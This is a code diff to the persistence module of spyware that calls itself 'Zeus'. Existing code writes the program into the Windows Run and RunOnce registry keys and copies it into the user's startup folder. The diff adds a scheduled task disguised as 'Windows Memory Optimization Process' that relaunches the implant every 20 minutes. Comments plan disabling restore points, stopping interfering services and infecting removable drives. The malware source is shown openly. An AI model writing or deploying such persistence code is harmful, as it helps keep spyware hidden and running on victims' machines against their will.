@@ -1,6 +1,7 @@
 import platform
 import os
 import os.path
+import subprocess
 from shutil import copy
 
 try:
@@ -25,6 +26,10 @@ class BootPersistanceHandler:
     WINDOWS_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
     WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
 
+    #
+    # Main
+    #
+
     def addSelfToSystemToBoot(self):
         if (platform.system().lower() == "windows"):
             # 1. Use registry
@@ -34,10 +39,17 @@ class BootPersistanceHandler:
             # 2. Copy file manually
             self.copyFilesManually()
 
+            # 3. Schedule task in Windows
+            self.scheduleTaskInWindows()
+
             # 3. Disable restore points
             # 4. Disable windows services which can interfer propy injection to device
             # 5. Constantly check if removable devices is connected and if yes -
             # infect them as well (make spyware startup from removable device)
+
+    #
+    # Implant to Windows Registry
+    #
 
     def implantToRegistry(self):
         self.addSelfToRegistryPath(self.WINDOWS_REGISTRY_START_UP_PATH)
@@ -89,6 +101,10 @@ class BootPersistanceHandler:
             dict[data[0]] = data[1]
         return dict
 
+    #
+    # Copy files to Windows boot
+    #
+
     def copyFilesManually(self):
         filePath = os.path.abspath(__file__)
         zeusFileName = os.path.basename(filePath)
@@ -104,6 +120,32 @@ class BootPersistanceHandler:
         else:
             destination = r"%s/%s" % (destinationFolder.replace("\\", "/"), zeusFileName)
             print("[i] Zeus already installed in: %s" %destination)
+
+    #
+    # Schedule task in Windows
+    #
+
+    def scheduleTaskInWindows(self):
+        if not self.checkIfTaskExists():
+            print("[i] Implanting Zeus to Windows Task Scheduler.")
+
+            fullPath = os.path.abspath(__file__).replace(r"\\\\", r"\\")
+            taskCommand = r'schtasks /create /tn "Windows Memory Optimization Process" /sc minute /mo 20 /tr "%s"' % fullPath
+            results = subprocess.check_output(taskCommand, shell=True)
+        else:
+            print("[i] Zeus already installed in Windows Task Scheduler!")
+
+    def checkIfTaskExists(self):
+        results = subprocess.check_output("schtasks /query", shell=True)
+        results = results.decode("UTF-8")
+        if "Windows Memory Optimization Process" not in results:
+            return False
+        else:
+            return True
+
+    #
+    # Start here
+    #
 
     if (platform.system().lower() == "windows"):
         WINDOWS_START_UP_FOLDER_PREFIX = os.environ['userprofile']
